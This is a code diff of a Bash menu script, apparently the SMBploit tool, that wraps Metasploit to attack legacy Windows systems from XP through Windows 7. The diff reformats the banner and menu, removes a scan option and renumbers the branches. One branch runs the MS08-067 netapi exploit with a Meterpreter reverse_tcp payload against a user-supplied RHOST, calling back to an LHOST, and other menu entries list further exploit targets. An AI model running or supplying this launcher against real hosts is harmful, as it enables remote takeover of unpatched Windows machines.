@@ -26,7 +26,6 @@ n10=10
 n11=11
 n12=12
 n13=13
-n14=14
 n99=99
 si=✔
 no=✘
@@ -53,6 +52,7 @@ function checkroot(){
 }
 
 function banner(){
+	    echo ""
         echo -e "$b   ┌══════════════════════════════════════════┐"
         echo -e "$b   ║$v  ____  __  __ ____        _       _ _    $b║"
         echo -e "$b   ║$v / ___||  \/  | __ ) _ __ | | ___ (_) |_  $b║"
@@ -60,31 +60,32 @@ function banner(){
         echo -e "$b   ║$v  ___) | |  | | |_) | |_) | | (_) | | |_  $b║"
         echo -e "$b   ║$v |____/|_|  |_|____/| .__/|_|\___/|_|\__| $b║"   
         echo -e "$b   ║$v                    |_|                   $b║"
-        echo -e "$b   ║$r   Author  $b:$a d4t4s3c                      $b║"
-        echo -e "$b   ║$r   Email   $b:$a d4t4s3c@protonmail.com       $b║"
-        echo -e "$b   ║$r   GitHub  $b:$a www.github.com/d4t4s3c       $b║"
+        echo -e "$b   ║$r      Author  $b:$a d4t4s3c                   $b║"
+        echo -e "$b   ║$r      Email   $b:$a d4t4s3c@protonmail.com    $b║"
+        echo -e "$b   ║$r      GitHub  $b:$a www.github.com/d4t4s3c    $b║"
         echo -e "$b   └══════════════════════════════════════════┘$b"
 }
 
 function main(){
-        echo "" 
-        echo -e "$b <==============================================>"
-        echo -e "$b  [$v$n1$b]$r Scan $b   :$a Vuln MS17-010 $nc "
-        echo -e "$b  [$v$n2$b]$r Scan $b   :$a SMB Version $nc "
-        echo -e "$b  [$v$n3$b]$r Exploit $b:$a Windows XP$v x86 $nc "
-        echo -e "$b  [$v$n4$b]$r Exploit $b:$a Windows XP$v x64 $nc "
-        echo -e "$b  [$v$n5$b]$r Exploit $b:$a Windows Server 2003 SP0$v x86 $nc "
-        echo -e "$b  [$v$n6$b]$r Exploit $b:$a Windows Server 2003 SP1/SP2$v x86 $nc "
-        echo -e "$b  [$v$n7$b]$r Exploit $b:$a Windows Server 2003$v x64 $nc "
-        echo -e "$b  [$v$n8$b]$r Exploit $b:$a Windows Vista$v x86 "
-        echo -e "$b  [$v$n9$b]$r Exploit $b:$a Windows Vista$v x64 "
-        echo -e "$b  [$v$n10$b]$r Exploit $b:$a Windows Server 2008$v x86"
-        echo -e "$b  [$v$n11$b]$r Exploit $b:$a Windows Server 2008 R2$v x86"
-        echo -e "$b  [$v$n12$b]$r Exploit $b:$a Windows Server 2008 R2$v x64"
-        echo -e "$b  [$v$n13$b]$r Exploit $b:$a Windows 7$v x86"
-        echo -e "$b  [$v$n14$b]$r Exploit $b:$a Windows 7$v x64"      
-        echo -e "$b  [$v$n99$b]$r Exit $nc "
-        echo -e "$b <==============================================>"
+	    echo ""
+        echo -e "$b   +------------------------------------------+"
+        echo -e "$b   |$v Op $b|$r Module  $b|$a Windows Version    $b|$v Arch$b | "
+        echo -e "$b   +------------------------------------------+"
+        echo -e "$b   | $v$n1$b |$r Scan    $b|                     $b|     $b| $nc "
+        echo -e "$b   | $v$n2$b |$r Exploit $b|$a XP                  $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n3$b |$r Exploit $b|$a XP                  $b|$v x64 $b| $nc "
+        echo -e "$b   | $v$n4$b |$r Exploit $b|$a Server 2003 SP0     $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n5$b |$r Exploit $b|$a Server 2003 SP1+2   $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n6$b |$r Exploit $b|$a Server 2003         $b|$v x64 $b| $nc "
+        echo -e "$b   | $v$n7$b |$r Exploit $b|$a Vista               $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n8$b |$r Exploit $b|$a Vista               $b|$v x64 $b| $nc "
+        echo -e "$b   | $v$n9$b |$r Exploit $b|$a Server 2008         $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n10$b |$r Exploit $b|$a Server 2008 R2      $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n11$b |$r Exploit $b|$a Server 2008 R2      $b|$v x64 $b| $nc "
+        echo -e "$b   | $v$n12$b |$r Exploit $b|$a 7                   $b|$v x86 $b| $nc "
+        echo -e "$b   | $v$n13$b |$r Exploit $b|$a 7                   $b|$v x64 $b| $nc "      
+        echo -e "$b   | $v$n99$b |$r Exit    $b|                     $b|     $b| $nc "
+        echo -e "$b   +------------------------------------------+"
         echo ""
 }
 
@@ -111,18 +112,23 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    menu
     elif [ $opc -eq 2 ]; then
 	    echo ""
+	    echo -e "$a ¿LHOST?$nc"
+	    echo ""
+	    read lhost
+	    echo ""
 	    echo -e "$a ¿RHOST?$nc"
 	    echo ""
 	    read rhost
 	    echo ""
-	    clear
-	    echo -e "$a Scan IP:$v $rhost $nc"
-	    echo ""
-	    msfconsole -q -x " use auxiliary/scanner/smb/smb_version;
+	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
+	    set PAYLOAD windows/meterpreter/reverse_tcp;
 	    set RHOSTS $rhost;
-	    run;
+	    set LHOST $lhost;
+	    exploit;
 	    exit; "
 	    echo ""
+	    sleep 5
+	    clear
 	    sleep 1
 	    main
 	    menu
@@ -149,28 +155,6 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    main
 	    menu
     elif [ $opc -eq 4 ]; then
-	    echo ""
-	    echo -e "$a ¿LHOST?$nc"
-	    echo ""
-	    read lhost
-	    echo ""
-	    echo -e "$a ¿RHOST?$nc"
-	    echo ""
-	    read rhost
-	    echo ""
-	    msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
-	    set PAYLOAD windows/meterpreter/reverse_tcp;
-	    set RHOSTS $rhost;
-	    set LHOST $lhost;
-	    exploit;
-	    exit; "
-	    echo ""
-	    sleep 5
-	    clear
-	    sleep 1
-	    main
-	    menu
-    elif [ $opc -eq 5 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -194,7 +178,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 6 ]; then
+    elif [ $opc -eq 5 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -218,7 +202,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 7 ]; then
+    elif [ $opc -eq 6 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -242,7 +226,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 8 ]; then
+    elif [ $opc -eq 7 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -266,7 +250,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 9 ]; then
+    elif [ $opc -eq 8 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -290,7 +274,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 10 ]; then
+    elif [ $opc -eq 9 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -314,7 +298,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 11 ]; then
+    elif [ $opc -eq 10 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -338,7 +322,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 12 ]; then
+    elif [ $opc -eq 11 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -362,7 +346,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 13 ]; then
+    elif [ $opc -eq 12 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
@@ -386,7 +370,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    sleep 1
 	    main
 	    menu
-    elif [ $opc -eq 14 ]; then
+    elif [ $opc -eq 13 ]; then
             echo ""
 	    echo -e "$a ¿LHOST?$nc"
 	    echo ""
